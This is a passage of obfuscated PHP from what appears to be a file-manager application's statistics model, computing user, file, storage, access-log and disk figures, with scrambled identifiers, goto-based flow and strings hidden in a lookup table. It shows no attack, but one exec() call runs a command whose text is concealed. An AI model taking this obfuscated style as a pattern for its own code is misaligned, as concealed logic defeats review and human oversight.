(!$EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[982]] || !$EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[699]]) { return; } if ($EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1564]] == $cÙ‹ƒ¬éÙ[1054]) { $e¢£“†îĞÜ = $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1531]]; if ($EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1532]] != $cÙ‹ƒ¬éÙ[1054]) { $e¢£“†îĞÜ = 0; } $C£Íà›à¡ = ($EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1535]] + $e¢£“†îĞÜ) / $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[699]]; $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1486]] = $C£Íà›à¡ * 0.3; } else { if ($EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1564]] == $cÙ‹ƒ¬éÙ[307]) { $C£Íà›à¡ = $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[996]] / $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[982]]; $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1486]] = 0.3 + $C£Íà›à¡ * 0.5; } else { if ($EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1564]] == $cÙ‹ƒ¬éÙ[103]) { $C£Íà›à¡ = 0; if ($EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1530]]) { $C£Íà›à¡ = $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1531]] / $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1530]]; } $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1486]] = 0.3 + 0.5 + $C£Íà›à¡ * 0.2; } } } if ($EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1486]] > 0) { $C®³ëŸ÷ó = timeFloat() - $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1488]] - $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1491]]; $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1492]] = $C®³ëŸ÷ó * (1 - $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1486]]) / $EÍ¿ÖùçÊÙ[$cÙ‹ƒ¬éÙ[1486]]; } } public function copyFileStart($Aæ¦°‡à, $dˆÃ ×‘©³, $FÔ»¶éÍĞ¬, $Eº’Ò†š ˆ, $e„ç™ÜÌ , $C‚”ß³àÚ) { $eƒÓ”ÚËàù =& $_SERVER[úÎü]; parent::copyFileStart($Aæ¦°‡à, $dˆÃ ×‘©³, $FÔ»¶éÍĞ¬, $Eº’Ò†š ˆ, $e„ç™ÜÌ , $C‚”ß³àÚ); $DØøí—¥ƒ‘ =& $this->task; if ($DØøí—¥ƒ‘[$eƒÓ”ÚËàù[1564]] == $eƒÓ”ÚËàù[307]) { $DØøí—¥ƒ‘[$eƒÓ”ÚËàù[1564]] = $eƒÓ”ÚËàù[103]; } $this->update(); } public function copyFileEnd($Eö¨‰¦¾‡³, $AÕôë—†Ö, $FœÔÀÇÔŠĞ, $dÒ†‡á»Ğ, $f ÂÑ†Ì, $DÕã©ê½Á) { $aèÑ’­Šš“ =& $_SERVER[úÎü]; $Aî®ø»¸¯¼ =& $this->task; $Aî®ø»¸¯¼[$aèÑ’­Šš“[1531]] = $Aî®ø»¸¯¼[$aèÑ’­Šš“[1530]]; $Aî®ø»¸¯¼[$aèÑ’­Šš“[1535]] += $Aî®ø»¸¯¼[$aèÑ’­Šš“[1530]]; $Aî®ø»¸¯¼[$aèÑ’­Šš“[1532]] = $aèÑ’­Šš“[33]; $this->update(); } public function nameParse($AéŠÛ“ãÁ³) { $DãÎ­¯‰Í¥ =& $_SERVER[úÎü]; $F²‹‚Š ¯« =& $this->task; if ($F²‹‚Š ¯«[$DãÎ­¯‰Í¥[996]] < $F²‹‚Š ¯«[$DãÎ­¯‰Í¥[982]]) { $E©¤­ï‚Ñ˜ = get_path_this($AéŠÛ“ãÁ³); if (strstr($E©¤­ï‚Ñ˜, $DãÎ­¯‰Í¥[91])) { $F²‹‚Š ¯«[$DãÎ­¯‰Í¥[996]] += 1; } } if ($F²‹‚Š ¯«[$DãÎ­¯‰Í¥[1564]] == $DãÎ­¯‰Í¥[1054]) { $F²‹‚Š ¯«[$DãÎ­¯‰Í¥[1564]] = $DãÎ­¯‰Í¥[307]; } $F²‹‚Š ¯«[$DãÎ­¯‰Í¥[1528]] = $AéŠÛ“ãÁ³; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($dæ²“™ëôÏ) { $b„Ç•ÉÅÅš =& $_SERVER[úÎü]; $A°ÁâÇ÷Ö× = array($b„Ç•ÉÅÅš[551] => array($b„Ç•ÉÅÅš[29] => $b„Ç•ÉÅÅš[1569], $b„Ç•ÉÅÅš[267] => array($b„Ç•ÉÅÅš[218], $b„Ç•ÉÅÅš[701], $b„Ç•ÉÅÅš[1570], $b„Ç•ÉÅÅš[1571])), $b„Ç•ÉÅÅš[1572] => array($b„Ç•ÉÅÅš[29] => $b„Ç•ÉÅÅš[1573], $b„Ç•ÉÅÅš[267] => array($b„Ç•ÉÅÅš[218], $b„Ç•ÉÅÅš[699], $b„Ç•ÉÅÅš[1574], $b„Ç•ÉÅÅš[1575], $b„Ç•ÉÅÅš[1576]))); if (!isset($A°ÁâÇ÷Ö×[$dæ²“™ëôÏ])) { return !1; } $this->optionType = $A°ÁâÇ÷Ö×[$dæ²“™ëôÏ][$b„Ç•ÉÅÅš[29]]; $this->field = $A°ÁâÇ÷Ö×[$dæ²“™ëôÏ][$b„Ç•ÉÅÅš[267]]; return !0; } public function listData($F°ª‹‘éè = false, $D°ã±“é–† = "\x6d\x6f\144\x69\146\171\x54\151\x6d\x65", $cÕîŸ¨Ô¬¡ = false) { return parent::listData($F°ª‹‘éè, $D°ã±“é–†, $cÕîŸ¨Ô¬¡); } public function trendList($cáÁµ†¤è) { goto Dàë›š‘¥; AÈ£Ñ°ãğ: foreach ($dğ‚¤Ü‘… as $eíœ¨…—çº) { $this->{$AŒÌÎÚÆ©Ñ}($eíœ¨…—çº); } return $this->listData(); goto c˜Ÿ±Ùˆ; Dàë›š‘¥: $e¢‰¤¬İÎ =& $_SERVER[úÎü]; $e¼•µ¥É²Ã = $this->listData(); if ($e¼•µ¥É²Ã) { $fŒ™ƒìİ¿ = end($e¼•µ¥É²Ã); $eíœ¨…—çº = date($e¢‰¤¬İÎ[1577], strtotime($e¢‰¤¬İÎ[1578])); if ($fŒ™ƒìİ¿[$e¢‰¤¬İÎ[218]] == $eíœ¨…—çº) { return $e¼•µ¥É²Ã; } $aÕµì§ƒ = strtotime($fŒ™ƒìİ¿[$e¢‰¤¬İÎ[218]]); } goto cãÅÃŞïİ•; cãÅÃŞïİ•: if (!isset($aÕµì§ƒ)) { $DÀŒ†ÇŠ = $cáÁµ†¤è == $e¢‰¤¬İÎ[551] ? $e¢‰¤¬İÎ[494] : $e¢‰¤¬İÎ[752]; $aÕµì§ƒ = Model($DÀŒ†ÇŠ)->min($e¢‰¤¬İÎ[190]); } $AŒÌÎÚÆ©Ñ = $e¢‰¤¬İÎ[1579] . ucfirst($cáÁµ†¤è); $dğ‚¤Ü‘… = $this->dateList($aÕµì§ƒ); goto AÈ£Ñ°ãğ; c˜Ÿ±Ùˆ: } private function dateList($e¤ã£Ÿ‘£ƒ) { $B±ƒ‰Ğ˜à´ =& $_SERVER[úÎü]; $CÀÒ’–Ï‹Ì = $e¤ã£Ÿ‘£ƒ; $F¾”¸›çÕ‘ = strtotime($B±ƒ‰Ğ˜à´[1578]); $cÂíÛØõÄ¶ = array(); while ($CÀÒ’–Ï‹Ì <= $F¾”¸›çÕ‘) { $cÂíÛØõÄ¶[] = date($B±ƒ‰Ğ˜à´[1577], $CÀÒ’–Ï‹Ì); $CÀÒ’–Ï‹Ì = strtotime($B±ƒ‰Ğ˜à´[1580], $CÀÒ’–Ï‹Ì); } return $cÂíÛØõÄ¶; } public function _recordUser($C´Ñ¤Šøìë = '') { goto CÉÜö”Ì¿; aŒŞ±°±Ó: $AŠ†õù½’Ş = array($B‘¨íËñ©ß[218] => $C´Ñ¤Šøìë, $B‘¨íËñ©ß[701] => (int) $fÈÔÇ¥Ã¼Ó, $B‘¨íËñ©ß[1570] => (int) $AïÊ„«ƒù, $B‘¨íËñ©ß[1571] => (int) $DŞæŠÔ¾ï„); return $this->insert($AŠ†õù½’Ş); goto E½¨¢Ú‹Åµ; CÉÜö”Ì¿: $B‘¨íËñ©ß =& $_SERVER[úÎü]; $E³õ–…¢¯Ñ = strtotime(date($B‘¨íËñ©ß[1581], strtotime($C´Ñ¤Šøìë))); $dˆ…ŠˆŠ = strtotime(date($B‘¨íËñ©ß[1582], strtotime($C´Ñ¤Šøìë))); goto a²®¬ºí«; e•ß¯‰Ñˆ—: $AïÊ„«ƒù = Model($B‘¨íËñ©ß[494])->where($fÜœñøäñ)->count($B‘¨íËñ©ß[1485]); $fÜœñøäñ[$B‘¨íËñ©ß[29]] = $B‘¨íËñ©ß[1583]; $DŞæŠÔ¾ï„ = Model($B‘¨íËñ©ß[1584])->where($fÜœñøäñ)->count($B‘¨íËñ©ß[1585]); goto aŒŞ±°±Ó; a²®¬ºí«: $fÜœñøäñ = array($B‘¨íËñ©ß[190] => array($B‘¨íËñ©ß[931], $dˆ…ŠˆŠ)); $fÈÔÇ¥Ã¼Ó = Model($B‘¨íËñ©ß[494])->where($fÜœñøäñ)->count($B‘¨íËñ©ß[1485]); $fÜœñøäñ[$B‘¨íËñ©ß[190]] = array($B‘¨íËñ©ß[327], array($E³õ–…¢¯Ñ, $dˆ…ŠˆŠ)); goto e•ß¯‰Ñˆ—; E½¨¢Ú‹Åµ: } public function _recordStore($fËäµĞğ•Ó = '') { goto F«³»Ø; C¾ëƒº†Ì: $FÑô¾÷‡œ = Model($AŒóÒ‚Û[438])->where($E“æ›á§º)->sum($AŒóÒ‚Û[77]); $E“æ›á§º[$AŒóÒ‚Û[386]] = 0; $Eª·‰ì”æ = Model($AŒóÒ‚Û[752])->where($E“æ›á§º)->sum($AŒóÒ‚Û[77]); goto D¯¾Ù”Ã; F«³»Ø: $AŒóÒ‚Û =& $_SERVER[úÎü]; $Eœ‚¾¦êÃö = strtotime(date($AŒóÒ‚Û[1582], strtotime($fËäµĞğ•Ó))); $E“æ›á§º = array($AŒóÒ‚Û[190] => array($AŒóÒ‚Û[931], $Eœ‚¾¦êÃö)); goto C¾ëƒº†Ì; D¯¾Ù”Ã: $E“æ›á§º[$AŒóÒ‚Û[387]] = 1; $dÎèŠ¬êë½ = Model($AŒóÒ‚Û[752])->where($E“æ›á§º)->sum($AŒóÒ‚Û[77]); $E“æ›á§º[$AŒóÒ‚Û[387]] = 2; goto c»‚˜‚†¿°; c»‚˜‚†¿°: $fÇ–¯ë…ĞÉ = Model($AŒóÒ‚Û[752])->where($E“æ›á§º)->sum($AŒóÒ‚Û[77]); $b˜¸›•Ó… = array($AŒóÒ‚Û[218] => $fËäµĞğ•Ó, $AŒóÒ‚Û[699] => (int) $Eª·‰ì”æ, $AŒóÒ‚Û[1574] => (int) $FÑô¾÷‡œ, $AŒóÒ‚Û[1575] => (int) $dÎèŠ¬êë½, $AŒóÒ‚Û[1576] => (int) $fÇ–¯ë…ĞÉ); return $this->insert($b˜¸›•Ó…); goto B«ÊåÒç®ù; B«ÊåÒç®ù: } public function trend($eŒ›œ¨¢…¬, $EÏ—Ø¡ÉÉÂ) { goto f½õã—öóØ; B¨ç×î·‹: return $eÖºŸŞ¥Ùì; goto e¥Èš„¡½—; f½õã—öóØ: $aïï›„Šà =& $_SERVER[úÎü]; if (!$this->init($eŒ›œ¨¢…¬)) { return !1; } $f¨ŸÌ§·¸Ô = $this->trendList($eŒ›œ¨¢…¬); goto A´ô½À©¥‹; E‹åŠ„“…Õ: if (empty($f¨ŸÌ§·¸Ô)) { $FÏ¢‘İĞ¬á = date($aïï›„Šà[1577], strtotime($aïï›„Šà[1578])); $CÓ» †¡‡Û = array($aïï›„Šà[218] => $FÏ¢‘İĞ¬á); foreach ($e™Ãê…ğ«…[$eŒ›œ¨¢…¬] as $E•Ò¦æêŠÛ => $fÏì×ñœ) { $CÓ» †¡‡Û[$E•Ò¦æêŠÛ] = 0; } $f¨ŸÌ§·¸Ô[] = $CÓ» †¡‡Û; } $eÖºŸŞ¥Ùì = array(); foreach ($f¨ŸÌ§·¸Ô as $fÏì×ñœ) { if ($eŒ›œ¨¢…¬ == $aïï›„Šà[1572] && $fÏì×ñœ[$aïï›„Šà[1574]] > $fÏì×ñœ[$aïï›„Šà[699]]) { $fÏì×ñœ[$aïï›„Šà[1574]] = $fÏì×ñœ[$aïï›„Šà[699]]; } foreach ($e™Ãê…ğ«…[$eŒ›œ¨¢…¬] as $E•Ò¦æêŠÛ => $A…¢ÀìÊš¶) { $fóìºíöà„ = array($aïï›„Šà[218] => $fÏì×ñœ[$aïï›„Šà[218]], $aïï›„Šà[1387] => $A…¢ÀìÊš¶); $fóìºíöà„[$a¯œ˜âñå¹[$eŒ›œ¨¢…¬]] = isset($fÏì×ñœ[$E•Ò¦æêŠÛ]) ? $fÏì×ñœ[$E•Ò¦æêŠÛ] : 0; $eÖºŸŞ¥Ùì[] = $fóìºíöà„; } } goto B¨ç×î·‹; A´ô½À©¥‹: if ($f¨ŸÌ§·¸Ô && $EÏ—Ø¡ÉÉÂ != $aïï›„Šà[1459]) { $d¨‘ÁÈÒ›Å = $f¨ŸÌ§·¸Ô[0][$aïï›„Šà[218]]; $f†­Ó¾ãÑå = $this->validDate($EÏ—Ø¡ÉÉÂ, $d¨‘ÁÈÒ›Å); $b‘™±·Æ…š = array(); $c¶ğ½­Ç«é = array_to_keyvalue($f¨ŸÌ§·¸Ô, $aïï›„Šà[218]); foreach ($f†­Ó¾ãÑå as $FÏ¢‘İĞ¬á) { if (isset($c¶ğ½­Ç«é[$FÏ¢‘İĞ¬á])) { $fóìºíöà„ = $c¶ğ½­Ç«é[$FÏ¢‘İĞ¬á]; } else { $fóìºíöà„ = end($f¨ŸÌ§·¸Ô); $fóìºíöà„[$aïï›„Šà[218]] = $FÏ¢‘İĞ¬á; if ($eŒ›œ¨¢…¬ == $aïï›„Šà[551]) { $fóìºíöà„[$aïï›„Šà[1570]] = $fóìºíöà„[$aïï›„Šà[1571]] = 0; } } $b‘™±·Æ…š[] = $fóìºíöà„; } $f¨ŸÌ§·¸Ô = $b‘™±·Æ…š; } $e™Ãê…ğ«… = array($aïï›„Šà[551] => array($aïï›„Šà[701] => LNG($aïï›„Šà[1586]), $aïï›„Šà[1570] => LNG($aïï›„Šà[1587]), $aïï›„Šà[1571] => LNG($aïï›„Šà[1588])), $aïï›„Šà[1572] => array($aïï›„Šà[699] => LNG($aïï›„Šà[1589]), $aïï›„Šà[1574] => LNG($aïï›„Šà[1590]), $aïï›„Šà[1575] => LNG($aïï›„Šà[1591]), $aïï›„Šà[1576] => LNG($aïï›„Šà[1592]))); $a¯œ˜âñå¹ = array($aïï›„Šà[551] => $aïï›„Šà[1593], $aïï›„Šà[1572] => $aïï›„Šà[77]); goto E‹åŠ„“…Õ; e¥Èš„¡½—: } public function validDate($d®¡ß¡…à, $eÒö¤ùõ ©) { goto C«àˆèÃÃ; eÕ­ÔÎÊ: return $C¾ç†½¼ÓĞ; goto eã£šÍë¿; C«àˆèÃÃ: $C‹ÀØ®…•“ =& $_SERVER[úÎü]; $AºóÒÆÁ°¬ = date($C‹ÀØ®…•“[1577], strtotime($C‹ÀØ®…•“[1578])); $C¾ç†½¼ÓĞ = array($AºóÒÆÁ°¬); goto C”¨éğë—; C”¨éğë—: switch ($d®¡ß¡…à) { case $C‹ÀØ®…•“[1466]: $eÍ¤‚ìĞí = mktime(0, 0, 0, date($C‹ÀØ®…•“[1594]), date($C‹ÀØ®…•“[1208]) - date($C‹ÀØ®…•“[1270]) + 7 - 7, date($C‹ÀØ®…•“[1595])); $a –Á«ì° = 0; do { $D˜óİ›‡´æ = date($C‹ÀØ®…•“[1577], $eÍ¤‚ìĞí - 3600 * 24 * 7 * $a –Á«ì°); $C¾ç†½¼ÓĞ[] = $D˜óİ›‡´æ; $a –Á«ì°++; } while ($eÒö¤ùõ © < $D˜óİ›‡´æ); break; case $C‹ÀØ®…•“[1464]: $a –Á«ì° = 1; do { $Dã¤ÂŠßæÕ = date($C‹ÀØ®…•“[1596], strtotime("\x2d\40{$a –Á«ì°}\40\x6d\157\156\x74\x68\163")); $C¾ç†½¼ÓĞ[] = $Dã¤ÂŠßæÕ; $a –Á«ì°++; } while ($eÒö¤ùõ © < $Dã¤ÂŠßæÕ); break; case $C‹ÀØ®…•“[1597]: $a¢“Î…¼¸ = (int) date($C‹ÀØ®…•“[1595], strtotime($eÒö¤ùõ ©)); $a©İ„“›ï = (int) date($C‹ÀØ®…•“[1595]); if ($a¢“Î…¼¸ >= $a©İ„“›ï) { break; } for ($a¢“Î…¼¸; $a¢“Î…¼¸ < $a©İ„“›ï; $a¢“Î…¼¸++) { $C¾ç†½¼ÓĞ[] = $a¢“Î…¼¸ . $C‹ÀØ®…•“[1598]; } break; default: break; } if ($eÒö¤ùõ © > end($C¾ç†½¼ÓĞ)) { array_pop($C¾ç†½¼ÓĞ); } sort($C¾ç†½¼ÓĞ); goto eÕ­ÔÎÊ; eã£šÍë¿: } public function listTable($Fº°”Ë„çÊ) { $e‚ô§Ÿœí¡ = ucfirst($Fº°”Ë„çÊ); return Model($e‚ô§Ÿœí¡)->listData(); } public function option($cçŒÕ—Ğù©) { $CŒÁˆŸÊóí = $_SERVER[úÎü][1599] . ucfirst($cçŒÕ—Ğù©); return $this->{$CŒÁˆŸÊóí}(); } private function optionUser() { goto Eñ¥æ‘·â; dÓâ¡Å§Š›: $bÈ˜‹ÒÕ® = Model($bœ¬†×ùÔ¡[494])->where($F”™‘“¹øØ)->count($bœ¬†×ùÔ¡[1485]); return array($bœ¬†×ùÔ¡[696] => (int) $aõâÖàì”Ü, $bœ¬†×ùÔ¡[1603] => (int) ($aõâÖàì”Ü - $d êà¤ùá), $bœ¬†×ùÔ¡[1604] => (int) $d êà¤ùá, $bœ¬†×ùÔ¡[1605] => (int) $bÈ˜‹ÒÕ®, $bœ¬†×ùÔ¡[1606] => $d¨¸öœ°†); goto EĞ‡”ÌĞç¨; c‹Ã£İöÄ: $f°ÔÚ¿ƒŞò = strtotime($bœ¬†×ùÔ¡[1601]); $F”™‘“¹øØ = array($bœ¬†×ùÔ¡[1602] => array($bœ¬†×ùÔ¡[932], $f°ÔÚ¿ƒŞò)); $d¨¸öœ°† = (int) Model($bœ¬†×ùÔ¡[494])->where($F”™‘“¹øØ)->count($bœ¬†×ùÔ¡[1485]); goto B§¶ œ¥¨­; Eñ¥æ‘·â: $bœ¬†×ùÔ¡ =& $_SERVER[úÎü]; $aõâÖàì”Ü = Model($bœ¬†×ùÔ¡[494])->count($bœ¬†×ùÔ¡[1485]); $d êà¤ùá = Model($bœ¬†×ùÔ¡[494])->where($bœ¬†×ùÔ¡[1600])->count($bœ¬†×ùÔ¡[1485]); goto c‹Ã£İöÄ; B§¶ œ¥¨­: if (!$d¨¸öœ°†) { $d¨¸öœ°† = 1; } $f°ÔÚ¿ƒŞò = strtotime(date($bœ¬†×ùÔ¡[1581])); $F”™‘“¹øØ = array($bœ¬†×ùÔ¡[1602] => array($bœ¬†×ùÔ¡[932], $f°ÔÚ¿ƒŞò)); goto dÓâ¡Å§Š›; EĞ‡”ÌĞç¨: } private function optionFile() { goto DºèÍé¹®Ê; e¸òêöª÷: $DØ»…ê½éš = $f‰ƒô¬ßåö[$FØ›³èÜÄ[1574]]; $cÜ§ÂˆØí = Model($FØ›³èÜÄ[752])->where(array($FØ›³èÜÄ[386] => 0))->count($FØ›³èÜÄ[385]); $EİµÆµœïÉ = array($FØ›³èÜÄ[386] => 0, $FØ›³èÜÄ[190] => array($FØ›³èÜÄ[932], strtotime(date($FØ›³èÜÄ[1581])))); goto bò‰‚åÚ®î; bò‰‚åÚ®î: $d‰¯Š™®œ = Model($FØ›³èÜÄ[752])->where($EİµÆµœïÉ)->sum($FØ›³èÜÄ[77]); $c½£Îâ™ò = Model($FØ›³èÜÄ[752])->where($EİµÆµœïÉ)->count($FØ›³èÜÄ[385]); return array($FØ›³èÜÄ[699] => $D¥óî¨ßõÌ, $FØ›³èÜÄ[1574] => $DØ»…ê½éš, $FØ›³èÜÄ[1607] => $D¥óî¨ßõÌ - $DØ»…ê½éš, $FØ›³èÜÄ[1608] => (int) $d‰¯Š™®œ, $FØ›³èÜÄ[701] => (int) $cÜ§ÂˆØí, $FØ›³èÜÄ[1609] => (int) $c½£Îâ™ò); goto fõŸ¨ØööÚ; DºèÍé¹®Ê: $FØ›³èÜÄ =& $_SERVER[úÎü]; $f‰ƒô¬ßåö = $this->sourceSize(); $D¥óî¨ßõÌ = $f‰ƒô¬ßåö[$FØ›³èÜÄ[77]]; goto e¸òêöª÷; fõŸ¨ØööÚ: } private function optionAccess() { $cÀéßãáÅ… =& $_SERVER[úÎü]; return array($cÀéßãáÅ…[696] => $this->typeLogCnt(), $cÀéßãáÅ…[103] => $this->typeLogCnt($cÀéßãáÅ…[103]), $cÀéßãáÅ…[420] => $this->typeLogCnt($cÀéßãáÅ…[420]), $cÀéßãáÅ…[1610] => $this->typeLogCnt($cÀéßãáÅ…[1610]), $cÀéßãáÅ…[1611] => $this->typeLogCnt($cÀéßãáÅ…[1611]), $cÀéßãáÅ…[551] => $this->typeLogCnt($cÀéßãáÅ…[33], $cÀéßãáÅ…[1585])); } private function typeLogCnt($dÛ„ˆ®ˆ¨„ = '', $CàĞîš‹øä = "\x69\144") { goto FíÑŞ©å”; b†Åº¹ğµó: $DÎ¯±‰äŒ£ = array($Aï¢Ù‡Ÿ×º[190] => array($Aï¢Ù‡Ÿ×º[932], $E‹–ßèÊ©©)); if ($dÛ„ˆ®ˆ¨„) { $DÎ¯±‰äŒ£[$Aï¢Ù‡Ÿ×º[29]] = array($Aï¢Ù‡Ÿ×º[7], $eÜ©¥œ•¿µ[$dÛ„ˆ®ˆ¨„]); } $FØËù”³Ìë = Model($Aï¢Ù‡Ÿ×º[1584])->where($DÎ¯±‰äŒ£)->count($CàĞîš‹øä); goto Có´åÍ¬š¸; Có´åÍ¬š¸: return (int) $FØËù”³Ìë; goto eÏğô¶†ÙÛ; FíÑŞ©å”: $Aï¢Ù‡Ÿ×º =& $_SERVER[úÎü]; $eÜ©¥œ•¿µ = array($Aï¢Ù‡Ÿ×º[103] => array($Aï¢Ù‡Ÿ×º[1612], $Aï¢Ù‡Ÿ×º[1613]), $Aï¢Ù‡Ÿ×º[420] => array($Aï¢Ù‡Ÿ×º[1614], $Aï¢Ù‡Ÿ×º[1615]), $Aï¢Ù‡Ÿ×º[1610] => array($Aï¢Ù‡Ÿ×º[1616], $Aï¢Ù‡Ÿ×º[1617], $Aï¢Ù‡Ÿ×º[1618]), $Aï¢Ù‡Ÿ×º[1611] => array($Aï¢Ù‡Ÿ×º[1619], $Aï¢Ù‡Ÿ×º[1620]), $Aï¢Ù‡Ÿ×º[1621] => array($Aï¢Ù‡Ÿ×º[1622], $Aï¢Ù‡Ÿ×º[1623], $Aï¢Ù‡Ÿ×º[1624])); $E‹–ßèÊ©© = strtotime(date($Aï¢Ù‡Ÿ×º[1581])); goto b†Åº¹ğµó; eÏğô¶†ÙÛ: } private function optionServer() { goto cÖñé•‡˜¡; A½¹¹“•Ì¤: if ($d¯ ÷õÑ‰² == $c ‹ŠÚŞ•ç[724]) { $EÓ«‡ªÜ›… = explode($c ‹ŠÚŞ•ç[1122], $D—‹¿Ò´À[$c ‹ŠÚŞ•ç[892]]); $d¯ ÷õÑ‰² = $EÓ«‡ªÜ›…[0]; } if ($d¯ ÷õÑ‰² == $c ‹ŠÚŞ•ç[727] || $d¯ ÷õÑ‰² == $c ‹ŠÚŞ•ç[728]) { $dœ’ç˜…²° = Model()->db()->query($c ‹ŠÚŞ•ç[1625]); $A“¶…»é» = $dœ’ç˜…²°[0] && isset($dœ’ç˜…²°[0][$c ‹ŠÚŞ•ç[1386]]) ? $dœ’ç˜…²°[0][$c ‹ŠÚŞ•ç[1386]] : 0; $d¯ ÷õÑ‰² = $c ‹ŠÚŞ•ç[1626] . ($A“¶…»é» ? $c ‹ŠÚŞ•ç[8] . $A“¶…»é» : $c ‹ŠÚŞ•ç[33]); } $b¹†Ñ‘š³Æ = $GLOBALS[$c ‹ŠÚŞ•ç[6]][$c ‹ŠÚŞ•ç[343]][$c ‹ŠÚŞ•ç[754]]; goto B¾¢¨»©İ; c”ô™ÆÇ‹ƒ: $b…½ÔÖ·¾ = array($c ‹ŠÚŞ•ç[744] => $d¥­Æ–¤´[$c ‹ŠÚŞ•ç[383]]); $f©ÔéãÍ‚˜ = Model($c ‹ŠÚŞ•ç[438])->where($b…½ÔÖ·¾)->sum($c ‹ŠÚŞ•ç[77]); $a»™˜‰ŞÜ³ = explode($c ‹ŠÚŞ•ç[50], $_SERVER[$c ‹ŠÚŞ•ç[139]]); goto b—¬½øßàî; cÖñé•‡˜¡: $c ‹ŠÚŞ•ç =& $_SERVER[úÎü]; $DäçÓÌÕ = $this->diskDriver(); $d¥­Æ–¤´ = KodIO::defaultDriver(); goto c”ô™ÆÇ‹ƒ; B¾¢¨»©İ: return array($c ‹ŠÚŞ•ç[1627] => $DäçÓÌÕ ? $DäçÓÌÕ[$c ‹ŠÚŞ•ç[1628]] : 0, $c ‹ŠÚŞ•ç[1629] => $DäçÓÌÕ ? $DäçÓÌÕ[$c ‹ŠÚŞ•ç[1630]] : 0, $c ‹ŠÚŞ•ç[1631] => (int) $d¥­Æ–¤´[$c ‹ŠÚŞ•ç[1628]] * 1024 * 1024 * 1024, $c ‹ŠÚŞ•ç[1632] => (int) $f©ÔéãÍ‚˜, $c ‹ŠÚŞ•ç[1633] => ucfirst($cï˜ç±½Ğ†), $c ‹ŠÚŞ•ç[1634] => $c ‹ŠÚŞ•ç[1635] . PHP_VERSION, $c ‹ŠÚŞ•ç[1636] => phpBuild64() ? 64 : 32, $c ‹ŠÚŞ•ç[695] => str_replace($c ‹ŠÚŞ•ç[1637], $c ‹ŠÚŞ•ç[909], $d¯ ÷õÑ‰²), $c ‹ŠÚŞ•ç[343] => ucfirst($b¹†Ñ‘š³Æ), $c ‹ŠÚŞ•ç[28] => $_SERVER[$c ‹ŠÚŞ•ç[1638]]); goto d†•ê¯‘¨†; b—¬½øßàî: $cï˜ç±½Ğ† = $a»™˜‰ŞÜ³[0]; $D—‹¿Ò´À = $GLOBALS[$c ‹ŠÚŞ•ç[6]][$c ‹ŠÚŞ•ç[17]]; $d¯ ÷õÑ‰² = $D—‹¿Ò´À[$c ‹ŠÚŞ•ç[893]]; goto A½¹¹“•Ì¤; d†•ê¯‘¨†: } private function diskDriver() { goto eò´“šÀí; aĞÉÊ¤¥ÆÏ: $b­àŒ«ôà = $FĞ°„Æà” - @disk_free_space($d½ÇÏĞßÓ); return array($d†·íÙ¸Şá[1628] => $FĞ°„Æà”, $d†·íÙ¸Şá[1630] => $b­àŒ«ôà); goto eÊ²§æêÑô; eò´“šÀí: $d†·íÙ¸Şá =& $_SERVER[úÎü]; $d½ÇÏĞßÓ = $d†·íÙ¸Şá[8]; $c„‡–ôèçŠ = $GLOBALS[$d†·íÙ¸Şá[6]][$d†·íÙ¸Şá[1639]] == $d†·íÙ¸Şá[1640]; goto A¥Ö¨¢¶ˆ; A¥Ö¨¢¶ˆ: if ($c„‡–ôèçŠ) { $d½ÇÏĞßÓ = $d†·íÙ¸Şá[1641]; if (function_exists($d†·íÙ¸Şá[1642])) { exec($d†·íÙ¸Şá[1643], $bŞ¬êßÏæ); $d½ÇÏĞßÓ = $bŞ¬êßÏæ[1] . $d†·íÙ¸Şá[8]; } } if (!file_exists($d½ÇÏĞßÓ)) { return; } $FĞ°„Æà” = @disk_total_space($d½ÇÏĞßÓ); goto aĞÉÊ¤¥ÆÏ; eÊ²§æêÑô: } public function fileChart($B£Ú› š‰) { goto A”ã¬¯«¤´; EËˆ›‹‚ëİ: $B‡ËâÖšš[$aêù¹òÄëÀ[387]] = 2; $AâÈ¸áª½ò = Model($aêù¹òÄëÀ[752])->where($B‡ËâÖšš)->sum($aêù¹òÄëÀ[77]); return array($aêù¹òÄëÀ[699] => $a‰±‡°¹á´[$aêù¹òÄëÀ[77]], $aêù¹òÄëÀ[1574] => $a‰±‡°¹á´[$aêù¹òÄëÀ[1574]], $aêù¹òÄëÀ[1575] => (int) $AªéŸ÷œÈ’, $aêù¹òÄëÀ[1576] => (int) $AâÈ¸áª½ò); goto e²‡‹ºöè°; A”ã¬¯«¤´: $aêù¹òÄëÀ =& $_SERVER[úÎü]; if (isset($B£Ú› š‰[$aêù¹òÄëÀ[1485]])) { return Model($aêù¹òÄëÀ[752])->userFileTypeProfile($B£Ú› š‰[$aêù¹òÄëÀ[1485]]); } if (isset($B£Ú› š‰[$aêù¹òÄëÀ[1644]])) { return Model($aêù¹òÄëÀ[752])->groupFileTypeProfile($B£Ú› š‰[$aêù¹òÄëÀ[1644]]); } goto AÑ‰†ˆà‚ğ; AÑ‰†ˆà‚ğ: $a‰±‡°¹á´ = $this->sourceSize(); $B‡ËâÖšš = array($aêù¹òÄëÀ[478] => 0, $aêù¹òÄëÀ[387] => 1); $AªéŸ÷œÈ’ = 